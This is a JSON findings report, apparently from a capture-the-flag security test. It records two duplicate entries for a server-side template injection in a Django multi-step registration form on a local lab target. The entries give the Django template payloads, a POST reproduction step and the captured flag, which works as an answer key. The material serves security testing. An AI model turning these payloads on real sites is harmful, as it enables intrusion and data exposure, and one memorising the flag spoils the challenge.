@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:24:55.889009+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "8500e6b0-3c74-480e-ac9f-85332f5ee077",
+      "timestamp": "2026-04-14T14:24:55.888891+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Django Registration Flow",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40283",
+      "description": "The name parameter in the multi-step registration flow (/accounts/register/step1/) is vulnerable to Server-Side Template Injection. The user-supplied name is rendered in a Django template without proper sanitization, specifically in a dynamically generated JavaScript alert on step 3. This allows an attacker to access Django template context variables including the session model, which exposes the flag stored in the database.",
+      "evidence": "Flag: flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}\n\nSSTI confirmed via payload: {{ 7|add:7 }} rendered as 14 in the JS alert.\nPayload {{ request.session.model.objects }} exposed the flag through Django's debug error page output.",
+      "tool_used": "manual_ssti_exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /accounts/register/step1/ with name={{ request.session.model.objects }}",
+        "expected": "Flag flag{98d2361b-f883-4daa-93f7-cb5c91a32c69} appears in the rendered JavaScript alert on step 3"
+      }
+    },
+    {
+      "id": "cf59e03b-7d1c-4fd7-a9fc-036bd66802a5",
+      "timestamp": "2026-04-14T14:24:55.975214+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Django Registration Flow",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40283",
+      "description": "The name parameter in the multi-step registration flow (/accounts/register/step1/) is vulnerable to Server-Side Template Injection. The user-supplied name is rendered in a Django template without proper sanitization, specifically in a dynamically generated JavaScript alert on step 3. This allows an attacker to access Django template context variables including the session model, which exposes the flag stored in the database.",
+      "evidence": "Flag: flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}\n\nSSTI confirmed via payload: {{ 7|add:7 }} rendered as 14 in the JS alert.\nPayload {{ request.session.model.objects }} exposed the flag through Django's debug error page output.",
+      "tool_used": "manual_ssti_exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /accounts/register/step1/ with name={{ request.session.model.objects }}",
+        "expected": "Flag flag{98d2361b-f883-4daa-93f7-cb5c91a32c69} appears in the rendered JavaScript alert on step 3"
+      }
+    }
+  ],
+  "diagrams": []
+}
